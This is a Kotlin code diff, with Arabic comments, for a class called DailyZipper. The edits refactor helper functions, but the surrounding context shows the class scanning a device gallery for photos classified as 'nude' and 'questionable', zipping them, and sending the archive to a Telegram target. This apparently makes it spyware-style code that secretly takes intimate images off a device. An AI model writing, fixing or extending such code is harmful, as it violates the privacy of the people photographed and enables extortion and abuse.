@@ -79,14 +79,25 @@ class DailyZipper(
             return DailyZipper(context, scanner, telegram)
         }
 
-        // ===== دوال مساعدة آمنة لاستخراج القيم من الخرائط =====
-        // يتم تعريفهما هنا لمنع أي تداخل مع MatchGroupCollection
+        // ===== دوال مساعدة آمنة تماماً باستخدام entries لتجنب أي تعارض مع MatchGroupCollection =====
         private fun safeGetBooleanFromMap(obj: Any?, key: String): Boolean {
-            return (obj as? Map<*, *>)?.get(key) as? Boolean ?: false
+            val map = obj as? Map<*, *> ?: return false
+            for (entry in map.entries) {
+                if (entry.key == key) {
+                    return entry.value as? Boolean ?: false
+                }
+            }
+            return false
         }
 
         private fun safeGetStringFromMap(obj: Any?, key: String): String {
-            return (obj as? Map<*, *>)?.get(key) as? String ?: ""
+            val map = obj as? Map<*, *> ?: return ""
+            for (entry in map.entries) {
+                if (entry.key == key) {
+                    return entry.value as? String ?: ""
+                }
+            }
+            return ""
         }
     }
 
@@ -311,7 +322,6 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // ✅ استخدام الدالة المساعدة الآمنة لتجنب أي تعارض
                 val success = when (result) {
                     is Boolean -> result
                     else -> safeGetBooleanFromMap(result, "ok")
@@ -643,7 +653,6 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام الدالة المساعدة الآمنة لتجنب أي تعارض
                             val path = safeGetStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
